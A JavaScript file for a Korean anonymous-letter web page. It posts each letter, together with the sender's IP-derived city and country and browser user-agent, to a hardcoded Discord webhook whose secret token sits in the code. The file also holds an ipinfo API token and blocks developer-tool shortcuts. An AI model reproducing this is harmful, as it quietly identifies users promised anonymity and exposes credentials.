const webhookURL = "https://discord.com/api/webhooks/1360324723883642931/70RY9dIQYnakAeMKRnGa3rHatDclzMkpq30tgsvRP1qZYhkfHM8GANiTYO4EnHrAUASU";

function acceptConsent() {
  document.getElementById("consentScreen").style.display = "none";
  document.getElementById("mainApp").style.display = "block";
}

function sendLetter() {
  const title = document.getElementById("titleInput").value.trim();
  const message = document.getElementById("messageInput").value.trim();
  const status = document.getElementById("status");

  if (localStorage.getItem("letter_sent") === "true") {
    status.textContent = "❌ 이미 편지를 보냈습니다. 다시 보낼 수 없습니다.";
    return;
  }

  if (!title || !message) {
    status.textContent = "❗ 제목과 내용을 모두 입력해주세요.";
    return;
  }

  const deviceInfo = navigator.userAgent;

  fetch("https://ipinfo.io/json?token=27854d1235c512")
    .then(res => res.json())
    .then(location => {
      const cityInfo = `${location.city || "Unknown"}, ${location.country || "Unknown"}`;

      const content = `📬 새 익명 편지 도착!\n\n📌 제목: ${title}\n💬 내용: ${message}\n\n📍 위치: ${cityInfo}\n💻 기기: ${deviceInfo}`;

      return fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "익명 편지 봇",
          content: content
        })
      });
    })
    .then(res => {
      if (res.ok) {
        status.textContent = "✅ 편지가 성공적으로 전송되었습니다.";
        localStorage.setItem("letter_sent", "true");
        document.getElementById("titleInput").value = "";
        document.getElementById("messageInput").value = "";
      } else {
        status.textContent = "⚠️ 전송 실패. 다시 시도해주세요.";
      }
    })
    .catch(err => {
      status.textContent = "❌ 오류 발생: " + err.message;
    });
}

// 개발자 도구 방지
document.addEventListener("keydown", function (e) {
  if (
    e.key === "F12" ||
    (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i") ||
    (e.ctrlKey && e.key.toLowerCase() === "u")
  ) {
    e.preventDefault();
    alert("🚫 개발자 도구 사용이 제한되었습니다.");
  }
});
